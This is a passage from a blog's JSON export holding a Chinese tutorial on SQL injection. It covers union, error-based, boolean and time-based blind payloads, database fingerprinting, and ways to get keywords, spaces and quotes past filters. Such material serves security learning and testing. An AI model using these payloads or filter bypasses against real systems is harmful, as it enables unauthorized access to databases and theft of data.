第二种是关键词直接拦截，这种情况下可以通过变换函数等方式来进行绕过。\n\n## 4.2 空格过滤\n\n- 使用/**/即SQL语句中的注释语句来绕过。\n- 使用双写URL编码绕过，例如(%20 → %2%200)。\n- 通过特殊符号（反引号、加号、括号等等），绕过空格。（在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。）\n- 通过科学计数法绕过：where id=0e1union select 1,2\n- Fuzz所有字符，查找可替代空格的字符例如 %09 %0a %0b %0c %0d。\n\n| URL编码 | 符号 |\n| - | - |\n%09 | TAB 键（水平）\n%0a | 新建一行\n%0c | 新的一页\n%0d | return 功能\n%0b | TAB 键（垂直）\n%a0 | 空格\n\n数据库 | 空白字符\n| - | - |\nSQLite3 | 0A 0D 0C 09 20\nMYSQL5 | 09 0A 0B 0C 0D A0 20\nPosgresSQL | 0A 0D 0C 09 20\nOracle 11g | 00 0A 0D 0C 09 20\nMSSQL | 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F 20\n\n## 4.3 逗号过滤/拦截\n\n拦截逗号后，意味着大部分的联合查询注入都失效，这个时候可以尝试进行盲注。\n\nsubstring和if语句都用到了逗号，因此无法使用。\n\nsubstring可以用substr()函数来进行代替，if语句可以通过and语句来进行代替。\n\n\n## 4.4 单引号拦截/过滤/转义\n\n当引号存在过滤和转义的情况下，可以这样处理：\n\n### 4.4.1 利用编码特性绕过。（宽字节注入）\n\n比较典型的使用编码就是GBK编码：使用前面的字符吃掉后面的字符(斜杆)。\n\n待补充\n\n### 4.4.2 利用反斜杠\\绕过\n\n待补充\n\n### 4.4.3 将 utf-8 转换为 utf-16 或 utf-32\n\n待补充\n\n## 4.5 数字被过滤/拦截绕过\n\n数字被屏蔽时，用响应函数结果来构造。\n\n- ceil() ：为向上取整函数\n- floor()：为向下取整函数\n- ! ~~：起到取反的效果\n- pi() ：π值\n- version()：利用当前版本号进行数字的构造\n- false：值为0\n- true：值为1\n\n## 4.6 等号过滤\n\n- 当等于号=呗过滤时，可以使用：like,in 等字符替换\n\n```sql\n?id=1' or '1' IN ('1234')#\n?id=1' or 1 like 1#\n```\n\n## 4.7 其他关键字过滤/拦截绕过\n\n关键字被过滤时，可以通过双写或大小写、其他编码例如十六进制、URL编码来进行绕过：\n\n关键字 | 双写 | 大小写 | 其他编码 | 符号\n| - | - | - | - | - |\nand | aandnd | and | an\\x64 | &&\nselect | selselectect | SelECt | selec\\x74 | \nor | oorr | oR | o\\x72 | \\|\\|\nunion | uniunionon | uNioN | unio\\x6e | \n\n# 参考内容\n\n[sql注入总结](https://johnfrod.top/%e5%ae%89%e5%85%a8/sql%e6%b3%a8%e5%85%a5%e6%80%bb%e7%bb%93/)\n\n[注入天书](https://files.cnblogs.com/files/lcamry/mysql-injection.pdf)\n","slug":"2022-08-04.经典漏洞-SQL注入","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"cl6nug9b3000ioqna6q0yhj2s","content":"<ul>\n<li><a href=\"#1-%E5%8E%9F%E7%90%86--%E7%B1%BB%E5%9E%8B\">1 原理 &amp; 类型</a><ul>\n<li><a href=\"#11-sql-%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86\">1.1 SQL 注入原理</a></li>\n<li><a href=\"#12-sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%B1%BB%E5%9E%8B%E6%8C%89%E6%8A%80%E5%B7%A7%E5%88%86%E7%B1%BB\">1.2 SQL注入的类型(按技巧分类)</a></li>\n</ul>\n</li>\n<li><a href=\"#2-%E6%A3%80%E6%B5%8B%E6%89%8B%E6%AE%B5\">2 检测手段</a><ul>\n<li><a href=\"#21-%E6%B3%A8%E5%85%A5%E7%82%B9%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8--%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B\">2.1 注入点是否存在 &amp; 数据类型</a><ul>\n<li><a href=\"#211-%E6%B7%BB%E5%8A%A0%E5%8D%95%E5%BC%95%E5%8F%B7\">2.1.1 添加单引号</a></li>\n<li><a href=\"#212-%E6%B7%BB%E5%8A%A0%E8%BF%90%E7%AE%97%E7%AC%A6\">2.1.2 添加运算符</a></li>\n</ul>\n</li>\n<li><a href=\"#22-%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B\">2.2 注入类型</a><ul>\n<li><a href=\"#221-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5\">2.2.1 堆叠注入</a></li>\n<li><a href=\"#222-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5\">2.2.2 报错注入</a><ul>\n<li><a href=\"#2221-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5\">2.2.2.1 联合查询注入</a><ul>\n<li><a href=\"#%E8%A1%A8%E7%9A%84%E5%AD%97%E6%AE%B5%E6%95%B0%E9%87%8F%E5%88%A4%E6%96%AD\">表的字段数量判断</a></li>\n<li><a href=\"#%E6%98%BE%E7%A4%BA%E5%AD%97%E6%AE%B5%E5%86%85%E5%AE%B9%E5%88%A4%E6%96%AD\">显示字段内容判断</a></li>\n</ul>\n</li>\n<li><a href=\"#2222-group-by%E9%87%8D%E5%A4%8D%E5%BB%BA%E5%86%B2%E7%AA%81%E6%8A%A5%E9%94%99\">2.2.2.2 group by重复建冲突报错</a></li>\n<li><a href=\"#2223-xpath%E8%AF%AD%E6%B3%95%E9%94%99%E8%AF%AF\">2.2.2.3 xpath语法错误</a></li>\n</ul>\n</li>\n<li><a href=\"#223-%E7%9B%B2%E6%B3%A8\">2.2.3 盲注</a><ul>\n<li><a href=\"#2231-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8\">2.2.3.1 布尔盲注</a><ul>\n<li><a href=\"#%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E9%95%BF%E5%BA%A6\">判断数据库名长度</a></li>\n<li><a href=\"#%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D\">判断数据库名</a></li>\n</ul>\n</li>\n<li><a href=\"#2232-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8\">2.2.3.2 时间盲注</a></li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><a href=\"#3-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A4%E6%96%AD\">3 数据库判断</a><ul>\n<li><a href=\"#31-%E5%B8%B8%E8%A7%81%E5%89%8D%E7%AB%AF%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%E5%8C%B9%E9%85%8D\">3.1 常见前端与数据库类型匹配</a></li>\n<li><a href=\"#32-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A0%87%E5%BF%97%E6%80%A7%E4%BF%A1%E6%81%AF\">3.2 数据库标志性信息</a></li>\n<li><a href=\"#33-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F\">3.3 字符串处理方式</a></li>\n<li><a href=\"#34-%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7%E4%B8%8E%E6%B3%A8%E9%87%8A\">3.4 特殊符号与注释</a></li>\n</ul>\n</li>\n<li><a href=\"#4-%E7%BB%95%E8%BF%87\">4 绕过</a><ul>\n<li><a href=\"#41-%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4\">4.1 关键字过滤</a></li>\n<li><a href=\"#42-%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4\">4.2 空格过滤</a></li>\n<li><a href=\"#43-%E9%80%97%E5%8F%B7%E8%BF%87%E6%BB%A4%E6%8B%A6%E6%88%AA\">4.3 逗号过滤&#x2F;拦截</a></li>\n<li><a href=\"#44-%E5%8D%95%E5%BC%95%E5%8F%B7%E6%8B%A6%E6%88%AA%E8%BF%87%E6%BB%A4%E8%BD%AC%E4%B9%89\">4.4 单引号拦截&#x2F;过滤&#x2F;转义</a><ul>\n<li><a href=\"#441-%E5%88%A9%E7%94%A8%E7%BC%96%E7%A0%81%E7%89%B9%E6%80%A7%E7%BB%95%E8%BF%87%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5\">4.4.1 利用编码特性绕过。（宽字节注入）</a></li>\n<li><a href=\"#442-%E5%88%A9%E7%94%A8%E5%8F%8D%E6%96%9C%E6%9D%A0%E7%BB%95%E8%BF%87\">4.4.2 利用反斜杠\\绕过</a></li>\n<li><a href=\"#443-%E5%B0%86-utf-8-%E8%BD%AC%E6%8D%A2%E4%B8%BA-utf-16-%E6%88%96-utf-32\">4.4.3 将 utf-8 转换为 utf-16 或 utf-32</a></li>\n</ul>\n</li>\n<li><a href=\"#45-%E6%95%B0%E5%AD%97%E8%A2%AB%E8%BF%87%E6%BB%A4%E6%8B%A6%E6%88%AA%E7%BB%95%E8%BF%87\">4.5 数字被过滤&#x2F;拦截绕过</a></li>\n<li><a href=\"#46-%E7%AD%89%E5%8F%B7%E8%BF%87%E6%BB%A4\">4.6 等号过滤</a></li>\n<li><a href=\"#47-%E5%85%B6%E4%BB%96%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E6%8B%A6%E6%88%AA%E7%BB%95%E8%BF%87\">4.7 其他关键字过滤&#x2F;拦截绕过</a></li>\n</ul>\n</li>\n<li><a href=\"#%E5%8F%82%E8%80%83%E5%86%85%E5%AE%B9\">参考内容</a></li>\n</ul>\n<h1 id=\"1-原理-amp-类型\"><a href=\"#1-原理-amp-类型\" class=\"headerlink\" title=\"1 原理 &amp; 类型\"></a>1 原理 &amp; 类型</h1><h2 id=\"1-1-SQL-注入原理\"><a href=\"#1-1-SQL-注入原理\" class=\"headerlink\" title=\"1.1 SQL 注入原理\"></a>1.1 SQL 注入原理</h2><p>基本的SQL查询语句如下所示，其中 <code>$id</code> 为提交的变量，当这个参数没有做非常严格的过滤，通过对 <code>$id</code> 的构造，数据库能输出攻击者想要获取的内容，就造成了SQL注入的漏洞。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;$id&#x27;</span> LIMIT <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span><br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>Tips: <code>$id</code> 参数可能存在于任何参数传递的位置：</p>\n<ul>\n<li>GET&#x2F;POST&#x2F;PUT&#x2F;DELETE 参数</li>\n<li>X-Forwarded-For(详细内容待补充)</li>\n<li>查询、搜索</li>\n<li>页码、选择菜单</li>\n<li>账号、密码</li>\n<li>文件名</li>\n</ul>\n</blockquote>\n<h2 id=\"1-2-SQL注入的类型-按技巧分类\"><a href=\"#1-2-SQL注入的类型-按技巧分类\" class=\"headerlink\" title=\"1.2 SQL注入的类型(按技巧分类)\"></a>1.2 SQL注入的类型(按技巧分类)</h2><ul>\n<li>盲注<ul>\n<li>布尔盲注：只能从应用返回中推断语句执行后的布尔值</li>\n<li>时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断</li>\n</ul>\n</li>\n<li>报错注入：应用会显示全部或者部分的报错信息</li>\n<li>堆叠注入：有的应用可以加入 ; 后一次执行多条语句</li>\n<li>联合查询注入：</li>\n</ul>\n<h1 id=\"2-检测手段\"><a href=\"#2-检测手段\" class=\"headerlink\" title=\"2 检测手段\"></a>2 检测手段</h1><h2 id=\"2-1-注入点是否存在-amp-数据类型\"><a href=\"#2-1-注入点是否存在-amp-数据类型\" class=\"headerlink\" title=\"2.1 注入点是否存在 &amp; 数据类型\"></a>2.1 注入点是否存在 &amp; 数据类型</h2><h3 id=\"2-1-1-添加单引号\"><a href=\"#2-1-1-添加单引号\" class=\"headerlink\" title=\"2.1.1 添加单引号\"></a>2.1.1 添加单引号</h3><p>修改参数 <code>$id</code> 的值，在其中加入单引号，将SQL查询内容不闭合，如下所示，页面可能会显示部分或者全部数据库报错内容(如果没有被过滤)，则存在注入点，且注入类型为字符型。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;$id&#x27;&#x27; LIMIT 0,1</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-1-2-添加运算符\"><a href=\"#2-1-2-添加运算符\" class=\"headerlink\" title=\"2.1.2 添加运算符\"></a>2.1.2 添加运算符</h3><p>传入的参数并没有显示在报错信息中，则传入的参数前面可能没有引号包裹，于是注入的类型可能是数字型。可以通过在id后添加运算符，如-1，+2，来观察页面的内容是否会变成对应的 id 来判断是否存在注入点，此时注入类型为数字型。</p>\n<p>如下所示，将id变为1+1，+号在URL中会被编码为空格，所以我们需要提前将+号进行URL编码，变为：%2b</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;1+1&#x27;</span> LIMIT <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span>;<br><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;1%2b1&#x27;</span> LIMIT <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span>;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-2-注入类型\"><a href=\"#2-2-注入类型\" class=\"headerlink\" title=\"2.2 注入类型\"></a>2.2 注入类型</h2><h3 id=\"2-2-1-堆叠注入\"><a href=\"#2-2-1-堆叠注入\" class=\"headerlink\" title=\"2.2.1 堆叠注入\"></a>2.2.1 堆叠注入</h3><p>分号 <code>;</code> 在sql中意味着一条语句的结束，可以在分号后继续构造第二条语句，数据库依然会继续执行，这样就会存在堆叠注入。</p>\n<blockquote>\n<p>Tips: 堆叠注入存在局限性</p>\n<ol>\n<li>结果不会在页面显示</li>\n<li>接口或者数据库引擎不支持</li>\n</ol>\n</blockquote>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;1&#x27;</span>;<span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-number\">1</span>,database(),version(),<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">5</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-2-2-报错注入\"><a href=\"#2-2-2-报错注入\" class=\"headerlink\" title=\"2.2.2 报错注入\"></a>2.2.2 报错注入</h3><h4 id=\"2-2-2-1-联合查询注入\"><a href=\"#2-2-2-1-联合查询注入\" class=\"headerlink\" title=\"2.2.2.1 联合查询注入\"></a>2.2.2.1 联合查询注入</h4><h5 id=\"表的字段数量判断\"><a href=\"#表的字段数量判断\" class=\"headerlink\" title=\"表的字段数量判断\"></a>表的字段数量判断</h5><p>在mysql、mariadb、oracle等数据库中，可以使用数字来代替对应字段(列)的名称，如果数据库中没有对应的字段(列)，就会报错。使用 order by 让 <code>$id</code> 按照不同的字段排序，直到 order by 后的数字超出了字段数量，则会返回报错信息。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;1&#x27;</span> <span class=\"hljs-keyword\">order</span> <span class=\"hljs-keyword\">by</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-comment\">--+ LIMIT 0,1;</span><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"显示字段内容判断\"><a href=\"#显示字段内容判断\" class=\"headerlink\" title=\"显示字段内容判断\"></a>显示字段内容判断</h5><p>union 联合查询时，当前面的语句为假，则后面的查询结果会显示到相应的位置。则可以通过在前面查询语句中添加 and 1&#x3D;2 使语句变假，来判断页面显示的内容为表中的哪几个字段。然后使用database()和version()替换相应的字段位置就可以查询数据库名称和版本号。 </p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;-1&#x27;</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">5</span> <span class=\"hljs-comment\">--+ LIMIT 0,1;</span><br><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;1&#x27;</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span><span class=\"hljs-operator\">=</span><span class=\"hljs-number\">2</span> <span class=\"hljs-keyword\">union</span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>,<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">5</span> <span class=\"hljs-comment\">--+ LIMIT 0,1;</span><br><br><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;-1&#x27;</span> <span class=\"hljs-keyword\">UNION</span> <span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-number\">1</span>,database(),version(),<span class=\"hljs-number\">4</span>,<span class=\"hljs-number\">5</span> <span class=\"hljs-comment\">--+</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"2-2-2-2-group-by重复建冲突报错\"><a href=\"#2-2-2-2-group-by重复建冲突报错\" class=\"headerlink\" title=\"2.2.2.2 group by重复建冲突报错\"></a>2.2.2.2 group by重复建冲突报错</h4><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;2&#x27;</span> <span class=\"hljs-keyword\">and</span> (<br>    <span class=\"hljs-keyword\">select</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">from</span> (<br>        <span class=\"hljs-keyword\">select</span> <span class=\"hljs-built_in\">count</span>(<span class=\"hljs-operator\">*</span>),concat(<br>            (<br>                <span class=\"hljs-keyword\">select</span> database() <span class=\"hljs-keyword\">from</span> information_schema.tables limit <span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">1</span>  <span class=\"hljs-comment\">--+ 真正的查询语句</span><br>            ),<span class=\"hljs-built_in\">floor</span>(rand()<span class=\"hljs-operator\">*</span><span class=\"hljs-number\">2</span>)<br>        )x <span class=\"hljs-keyword\">from</span> information_schema.tables <span class=\"hljs-keyword\">group</span> <span class=\"hljs-keyword\">by</span> x<br>    )a<br>) <span class=\"hljs-comment\">--+</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"2-2-2-3-xpath语法错误\"><a href=\"#2-2-2-3-xpath语法错误\" class=\"headerlink\" title=\"2.2.2.3 xpath语法错误\"></a>2.2.2.3 xpath语法错误</h4><p>xpath 语法报错注入，主要利用extractvalue()和updatexml()函数。  </p>\n<p>使用方法：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;2&#x27;</span> <span class=\"hljs-keyword\">and</span> extractvalue(<span class=\"hljs-number\">1</span>,concat(<span class=\"hljs-string\">&#x27;^&#x27;</span>,(<br>    <span class=\"hljs-keyword\">select</span> database()  <span class=\"hljs-comment\">--+ 真正的查询语句</span><br>    ),<span class=\"hljs-string\">&#x27;^&#x27;</span>)) <span class=\"hljs-comment\">--+</span><br><br><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;2&#x27;</span> <span class=\"hljs-keyword\">and</span> updatexml(<span class=\"hljs-number\">1</span>,concat(<span class=\"hljs-string\">&#x27;^&#x27;</span>,(<br>    <span class=\"hljs-keyword\">select</span> database()  <span class=\"hljs-comment\">--+ 真正的查询语句</span><br>    ),<span class=\"hljs-string\">&#x27;^&#x27;</span>),<span class=\"hljs-number\">1</span>) <span class=\"hljs-comment\">--+</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-2-3-盲注\"><a href=\"#2-2-3-盲注\" class=\"headerlink\" title=\"2.2.3 盲注\"></a>2.2.3 盲注</h3><h4 id=\"2-2-3-1-布尔盲注\"><a href=\"#2-2-3-1-布尔盲注\" class=\"headerlink\" title=\"2.2.3.1 布尔盲注\"></a>2.2.3.1 布尔盲注</h4><h5 id=\"判断数据库名长度\"><a href=\"#判断数据库名长度\" class=\"headerlink\" title=\"判断数据库名长度\"></a>判断数据库名长度</h5><p>改变length(database())&#x3D;的数值，当条件为真时，页面就会正常显示</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;2&#x27;</span> <span class=\"hljs-keyword\">and</span> length(database())<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">1</span> <span class=\"hljs-comment\">--+</span><br></code></pre></td></tr></table></figure>\n\n<h5 id=\"判断数据库名\"><a href=\"#判断数据库名\" class=\"headerlink\" title=\"判断数据库名\"></a>判断数据库名</h5><p>使用 sbustr 函数一位一位截取数据库名，如果为真，则页面正常显示</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;2&#x27;</span> <span class=\"hljs-keyword\">and</span> substr(database(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>)<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;s&#x27;</span> <span class=\"hljs-comment\">--+</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"2-2-3-2-时间盲注\"><a href=\"#2-2-3-2-时间盲注\" class=\"headerlink\" title=\"2.2.3.2 时间盲注\"></a>2.2.3.2 时间盲注</h4><p>当页面没有布尔状态时，可以通过观察页面响应时间是否变长来判断输入的条件是否正确。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\"><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;1&#x27;</span> <span class=\"hljs-keyword\">and</span> sleep(<span class=\"hljs-number\">10</span>) <span class=\"hljs-comment\">-- +&#x27; LIMIT 0,1;</span><br><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;1&#x27;</span> <span class=\"hljs-keyword\">and</span> if((length(database())<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">8</span>),sleep(<span class=\"hljs-number\">10</span>),<span class=\"hljs-number\">1</span>) <span class=\"hljs-comment\">--+</span><br><span class=\"hljs-keyword\">SELECT</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">FROM</span> users <span class=\"hljs-keyword\">WHERE</span> id<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;1&#x27;</span> <span class=\"hljs-keyword\">and</span> if((substr(database(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>)<span class=\"hljs-operator\">=</span><span class=\"hljs-string\">&#x27;s&#x27;</span>),sleep(<span class=\"hljs-number\">10</span>),<span class=\"hljs-number\">1</span>) <span class=\"hljs-comment\">--+</span><br></code></pre></td></tr></table></figure>\n\n<h1 id=\"3-数据库判断\"><a href=\"#3-数据库判断\" class=\"headerlink\" title=\"3 数据库判断\"></a>3 数据库判断</h1><h2 id=\"3-1-常见前端与数据库类型匹配\"><a href=\"#3-1-常见前端与数据库类型匹配\" class=\"headerlink\" title=\"3.1 常见前端与数据库类型匹配\"></a>3.1 常见前端与数据库类型匹配</h2><table>\n<thead>\n<tr>\n<th>前端语言</th>\n<th>数据库</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>sap</td>\n<td>sql server，Access</td>\n</tr>\n<tr>\n<td>.net</td>\n<td>sql server</td>\n</tr>\n<tr>\n<td>php</td>\n<td>PostgreSQL, Mysql</td>\n</tr>\n<tr>\n<td>java</td>\n<td>mysql, oracle</td>\n</tr>\n</tbody></table>\n<h2 id=\"3-2-数据库标志性信息\"><a href=\"#3-2-数据库标志性信息\" class=\"headerlink\" title=\"3.2 数据库标志性信息\"></a>3.2 数据库标志性信息</h2><table>\n<thead>\n<tr>\n<th>数据库</th>\n<th>信息查询</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>oracle</td>\n<td>select@@version –</td>\n</tr>\n<tr>\n<td>sql server</td>\n<td>select banner from v$version</td>\n</tr>\n<tr>\n<td>mysql</td>\n<td>select @@version, version() –, lenth(user)&gt;0</td>\n</tr>\n<tr>\n<td>postgreSQL</td>\n<td>select version() –</td>\n</tr>\n</tbody></table>\n<h2 id=\"3-3-字符串处理方式\"><a href=\"#3-3-字符串处理方式\" class=\"headerlink\" title=\"3.3 字符串处理方式\"></a>3.3 字符串处理方式</h2><table>\n<thead>\n<tr>\n<th>数据库</th>\n<th>处理方式</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>sql server</td>\n<td>id&#x3D;1 and ‘a’+’b’&#x3D;’ab’ –</td>\n</tr>\n<tr>\n<td>mssql</td>\n<td>id&#x3D;1 and ‘a’+’b’&#x3D;’ab’</td>\n</tr>\n<tr>\n<td>mysql</td>\n<td>id&#x3D;1 and ‘a’+’b’&#x3D;’ab’, ‘ab’&#x3D;concat(‘a’,’b’)</td>\n</tr>\n<tr>\n<td>oracle</td>\n<td>id&#x3D;1 and ‘a’+’b’&#x3D;’a’||’b’, ‘ab’&#x3D;concat(‘a’,’b’)</td>\n</tr>\n<tr>\n<td>postgresql</td>\n<td>id&#x3D;1 and ‘a’+’b’&#x3D;’a’||’b’, ‘ab’&#x3D;concat(‘a’,’b’)</td>\n</tr>\n</tbody></table>\n<h2 id=\"3-4-特殊符号与注释\"><a 